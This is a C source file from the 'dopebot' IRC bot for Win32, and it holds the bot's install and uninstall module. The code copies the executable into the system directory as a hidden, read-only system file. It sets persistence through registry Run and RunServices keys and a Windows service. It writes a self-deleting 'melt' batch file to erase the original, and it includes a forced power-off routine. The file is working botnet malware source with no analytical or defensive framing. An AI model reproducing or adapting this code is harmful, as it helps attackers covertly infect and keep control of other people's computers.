/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_INSTALL
#include "bot.h"

//Batch Run
void batch_run()
{
	char szBatPath[MAX_PATH], szFilePath[MAX_PATH], szTempDir[MAX_PATH];
	if (is_osnt()) return;
	if (!is_os9x()) return;

#ifndef NO_DEBUG
		printf("[DEBUG] Running melt batch, batch_run()\n");
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, MAX_PATH);
		GetTempPath(sizeof(szTempDir), szTempDir);
		sprintf(szBatPath, "%stmp.bat", szTempDir);
		execute_file(szBatPath, 0);
		return;
}

//Emergency Remove
void emergency_remove()
{
	char szBatPath[MAX_PATH], szFilePath[MAX_PATH], szTempDir[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Running emergency remove, emergency_remove()\n");
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, MAX_PATH);
		GetTempPath(sizeof(szTempDir), szTempDir);
		sprintf(szBatPath, "%stmp.bat", szTempDir);
		uninstall_bot(FALSE);
		regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rundll", szBatPath);
		ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
		ExitProcess(0);
		return;
}
//Install Bot
bool install_bot()
{
	HKEY rk = NULL;
	char szFilePath[MAX_PATH], szInstallPath[MAX_PATH], szSysDir[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Installing bot, install_bot()\n");
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));
		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, filename);
	if (file_exists(szInstallPath)) return FALSE;
	while (!CopyFile(szFilePath, szInstallPath, FALSE)) Sleep(5000);
		SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

#ifndef NO_REGISTRY
	if (useregistry)
	{
			regwritekey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (char *)regkeyname, szInstallPath);
			regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (char *)regkeyname, szInstallPath);
	}
#endif

#ifndef NO_SERVICE
	if (useservice)
	{
		if (is_osnt())
			install_service((char *)servicename, szInstallPath, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, FALSE);
		if (is_os9x())
			regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", (char *)servicename, szInstallPath);
	}
#endif

#ifndef NO_REGPORT
		regport();
#endif

#ifndef NO_MELT
	if (uninstall_bot(TRUE)) execute_file(szInstallPath, 0);
#endif

		ReleaseMutex((char *)botversion);
		ExitProcess(0);
		return TRUE;
}
#endif

//Uninstall Bot
bool uninstall_bot(bool bOnlyMelt)
{
	char szBatPath[MAX_PATH], szFilePath[MAX_PATH], szMeltText[IRCBUF], szTempDir[MAX_PATH];
	DWORD r;
	HANDLE hFile;
	if (bOnlyMelt) goto melt;
#ifndef NO_DEBUG
		printf("[DEBUG] Uninstalling bot, uninstall_bot()...\n");
#endif

#ifndef NO_REGISTRY
	if (useregistry)
	{
			regdeletekey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (char *)regkeyname);
			regdeletekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (char *)regkeyname);
	}
#endif

#ifndef NO_SERVICE
	if (useregistry)
	{
			uninstall_service((char *)servicename);
			regdeletekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", (char *)servicename);
	}
#endif
	
melt:	
#ifndef NO_FWB
	if (is_fwb())
	{
		char szSysDir[MAX_PATH];
		char szInstallPath[MAX_PATH];
			GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szInstallPath, "%s\\%s", szSysDir, filename);
			delete_file(szInstallPath);
			return TRUE;
	}
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, MAX_PATH);
		GetTempPath(sizeof(szTempDir), szTempDir);
		sprintf(szBatPath, "%stmp.bat", szTempDir);
		sprintf(szMeltText,
				"@echo off\r\n"
				":start\r\n"
				"attrib \"%s\" -R -A -S -H\r\n"
				"del \"%s\"\r\n"
				"if exist \"%s\" goto start\r\n"
				"del \"%s\"",
				szFilePath, szFilePath, szFilePath, szBatPath);
		hFile = CreateFile(szBatPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			return FALSE;
	}
		WriteFile(hFile, szMeltText, strlen(szMeltText), &r, NULL);
		CloseHandle(hFile);
	if (is_os9x()) return TRUE;
	if (!is_osnt()) return TRUE;
	if (!execute_file(szBatPath, 0))
		return FALSE;
	else
		return TRUE;
}
